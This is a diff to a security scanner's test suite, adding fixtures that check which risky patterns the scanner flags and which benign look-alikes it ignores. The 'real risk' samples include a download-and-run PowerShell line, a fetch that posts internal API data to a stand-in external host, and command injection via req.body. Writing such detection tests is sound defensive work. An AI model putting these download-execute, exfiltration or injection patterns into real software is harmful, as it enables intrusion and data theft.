@@ -76,6 +76,45 @@ async function run() {
   assert(!falsePositiveResult.issues.some((issue) => issue.ruleId === 'DANGEROUS_XSS'), 'Static or sanitized HTML produced XSS issue');
   assert(!falsePositiveResult.issues.some((issue) => issue.ruleId === 'NETWORK_HTTP'), 'Comment/localhost HTTP produced an issue');
   assert(!falsePositiveResult.issues.some((issue) => issue.ruleId === 'SECRET_SLACK_WEBHOOK'), 'Placeholder Slack webhook produced a secret issue');
+  assert(!falsePositiveResult.issues.some((issue) => issue.codeSnippet.filename === 'src/slack.ts'), 'Placeholder URL produced a network or secret issue');
+
+  const boundaryZip = new JSZip();
+  boundaryZip.file('scripts/messages.bat', `
+    echo powershell.exe -ExecutionPolicy Bypass -EncodedCommand EXAMPLE
+    echo cmd.exe /c %USER_COMMAND%
+    echo rm -rf C:\\important
+    echo reg add HKLM\\Software\\Example
+  `);
+  boundaryZip.file('scripts/messages.ps1', `
+    $example = 'powershell.exe -EncodedCommand EXAMPLE'
+    Write-Output 'Remove-Item -Recurse -Force C:\\Example'
+    Write-Host 'New-Service Example'
+  `);
+  boundaryZip.file('src/config.ts', `
+    const token = 'application/javascript';
+    const token2 = 'https://company.example/auth/callback';
+    const secret = 'Bearer authorization-header';
+    const password = 'correct horse battery staple';
+    const isAdmin = false;
+    const adminRole = user.role;
+  `);
+  boundaryZip.file('fixtures/private-key.ts', `const key = \`-----BEGIN PRIVATE KEY-----\nREDACTED\n-----END PRIVATE KEY-----\`;`);
+  boundaryZip.file('scripts/download.ps1', `curl https://example.com/readme.txt -o readme.txt\nWrite-Host 'download complete'\nStart-Process existing-app.exe`);
+  boundaryZip.file('src/transfer.ts', `const options = await loadDisplayOptions();\nfetch('https://ui.example/settings', { method: 'POST', body: JSON.stringify(options) });`);
+  boundaryZip.file('package.json', JSON.stringify({ scripts: { clean: 'rm -rf "$TARGET" # dist is generated' } }));
+  const boundaryBlob = await boundaryZip.generateAsync({ type: 'uint8array' });
+  const boundaryResult = await scanArtifacts([new File([boundaryBlob], 'boundary.zip')], 'internal');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'SCRIPT_ENCODED_COMMAND'), 'Echo/assigned PowerShell example was executed');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'SCRIPT_COMMAND_INJECTION'), 'Echoed command produced command-injection issue');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'SCRIPT_SYSTEM_CHANGE'), 'Echoed system command produced system-change issue');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'SECRET_CREDENTIAL'), 'Normal config values were treated as credentials');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'AUTH_CLIENT_SIDE'), 'Ordinary admin state produced a client-authorization issue');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'SECRET_PRIVATE_KEY'), 'Placeholder private-key block produced an issue');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'SCRIPT_DOWNLOAD_EXECUTE'), 'Unrelated download and executable were linked');
+  assert(!boundaryResult.issues.some((issue) => issue.ruleId === 'NETWORK_DATA_TRANSFER'), 'Ordinary external settings POST was treated as internal data transfer');
+  assert(boundaryResult.issues.some((issue) => issue.ruleId === 'SCRIPT_DESTRUCTIVE_DELETE' && issue.severity === 'medium'), 'Variable delete target hidden by safe-path comment');
+  const unexpectedBoundaryIssues = boundaryResult.issues.filter((issue) => !['NETWORK_EXTERNAL', 'SCRIPT_DESTRUCTIVE_DELETE'].includes(issue.ruleId || ''));
+  assert(unexpectedBoundaryIssues.length === 0, `Unexpected boundary issues: ${unexpectedBoundaryIssues.map((issue) => issue.ruleId).join(', ')}`);
 
   const realRisksZip = new JSZip();
   realRisksZip.file('scripts/run.bat', `set /p USER_COMMAND=Command:\r\ncmd.exe /c %USER_COMMAND%`);
@@ -83,6 +122,12 @@ async function run() {
   realRisksZip.file('src/xss.ts', 'element.innerHTML = req.body.content;');
   realRisksZip.file('src/powershell.ts', `exec('powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA');`);
   realRisksZip.file('src/credential.ts', 'const apiKey = "A9v!mQ2#zL8@pR4$xT7&nK5";');
+  realRisksZip.file('src/private-key.ts', `const key = \`-----BEGIN PRIVATE KEY-----\n${'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'.repeat(3)}\n-----END PRIVATE KEY-----\`;`);
+  realRisksZip.file('scripts/download.ps1', `Invoke-WebRequest https://outside.example/tool.exe -OutFile tool.exe\nStart-Process tool.exe`);
+  realRisksZip.file('src/exfil.ts', `const menus = await fetch(INTERNAL_API);\nfetch('https://hooks.example/receive', { method: 'POST', body: JSON.stringify(menus) });`);
+  realRisksZip.file('src/returned-http.ts', `function send() { return fetch('http://outside.example/data'); }`);
+  realRisksZip.file('src/client-auth.ts', `const isAdmin = localStorage.getItem('adminRole') === 'admin';`);
+  realRisksZip.file('tests/executed.test.ts', `exec(\`convert \${req.body.filename}\`);`);
   const realRisksBlob = await realRisksZip.generateAsync({ type: 'uint8array' });
   const realRisksResult = await scanArtifacts([new File([realRisksBlob], 'real-risks.zip')], 'internal');
   assert(realRisksResult.issues.some((issue) => issue.ruleId === 'SCRIPT_COMMAND_INJECTION' && issue.severity === 'high' && issue.codeSnippet.filename === 'scripts/run.bat'), 'User input to cmd.exe was not High');
@@ -90,6 +135,12 @@ async function run() {
   assert(realRisksResult.issues.some((issue) => issue.ruleId === 'DANGEROUS_XSS' && issue.severity === 'high'), 'req.body to innerHTML was not High');
   assert(realRisksResult.issues.some((issue) => issue.ruleId === 'SCRIPT_ENCODED_COMMAND' && issue.severity === 'critical'), 'Executed EncodedCommand was not detected');
   assert(realRisksResult.issues.some((issue) => issue.ruleId === 'SECRET_CREDENTIAL' && issue.severity === 'critical'), 'Real-looking generic credential was not detected');
+  assert(realRisksResult.issues.some((issue) => issue.ruleId === 'SECRET_PRIVATE_KEY' && issue.severity === 'critical'), 'Real private-key structure was not detected');
+  assert(realRisksResult.issues.some((issue) => issue.ruleId === 'SCRIPT_DOWNLOAD_EXECUTE' && issue.severity === 'critical'), 'Saved file execution chain was not detected');
+  assert(realRisksResult.issues.some((issue) => issue.ruleId === 'NETWORK_DATA_TRANSFER'), 'Internal data transfer to external service was not detected');
+  assert(realRisksResult.issues.some((issue) => issue.ruleId === 'NETWORK_HTTP' && issue.codeSnippet.filename === 'src/returned-http.ts'), 'Returned HTTP call was mistaken for a regex definition');
+  assert(realRisksResult.issues.some((issue) => issue.ruleId === 'AUTH_CLIENT_SIDE'), 'Client-controlled admin role was not detected');
+  assert(realRisksResult.issues.some((issue) => issue.ruleId === 'SCRIPT_COMMAND_INJECTION' && issue.codeSnippet.filename === 'tests/executed.test.ts' && issue.severity === 'high'), 'Actually executed test command was incorrectly downgraded');
 
   const reviewCases = new File(['cmd.exe /c %UNKNOWN_COMMAND%\r\nrm -rf "$TARGET"\r\nelement.innerHTML = content;'], 'review.bat', { type: 'text/plain' });
   const reviewResult = await scanArtifacts([reviewCases], 'internal');
@@ -103,6 +154,11 @@ async function run() {
   const env = new File(['PUBLIC_URL=https://intranet.example\nAPP_MODE=internal\nFEATURE_FLAG=true\n'], '.env', { type: 'text/plain' });
   const envResult = await scanArtifacts([env], 'internal');
   assert(envResult.issues.filter((issue) => issue.ruleId === 'ENV_INCLUDED').length === 1, '.env should create one file-level warning');
+  assert(envResult.issues.find((issue) => issue.ruleId === 'ENV_INCLUDED')?.severity === 'low', 'Public-only .env was overstated as high risk');
+
+  const sensitiveEnv = new File([`API_KEY=A9v!mQ2#zL8@pR4$xT7&nK5\n`], '.env.production', { type: 'text/plain' });
+  const sensitiveEnvResult = await scanArtifacts([sensitiveEnv], 'internal');
+  assert(sensitiveEnvResult.issues.some((issue) => issue.ruleId === 'ENV_INCLUDED' && issue.severity === 'high'), 'Sensitive .env value was not high risk');
 
   const clean = new File(['const greeting = "hello";\nconsole.log(greeting);\n'], 'clean.ts', { type: 'text/typescript' });
   const cleanResult = await scanArtifacts([clean], 'personal');
@@ -114,7 +170,7 @@ async function run() {
   const elapsedMs = Math.round(performance.now() - startedAt);
   assert(largeResult.scannedFiles === 1 && largeResult.issues.length === 0, 'Large file scan failed');
 
-  console.log(`Scanner checks passed: web=${webResult.issues.length}, script=${scriptResult.issues.length}, extension=${extensionResult.issues.length}, false-positive=${falsePositiveResult.issues.length}, real-risk=${realRisksResult.issues.length}, review=${reviewResult.issues.length}, env=${envResult.issues.length}, clean=0, large=12MB/${elapsedMs}ms`);
+  console.log(`Scanner checks passed: web=${webResult.issues.length}, script=${scriptResult.issues.length}, extension=${extensionResult.issues.length}, false-positive=${falsePositiveResult.issues.length}, boundary=${boundaryResult.issues.length}, real-risk=${realRisksResult.issues.length}, review=${reviewResult.issues.length}, env=${envResult.issues.length}, clean=0, large=12MB/${elapsedMs}ms`);
 }
 
 run().catch((error) => {
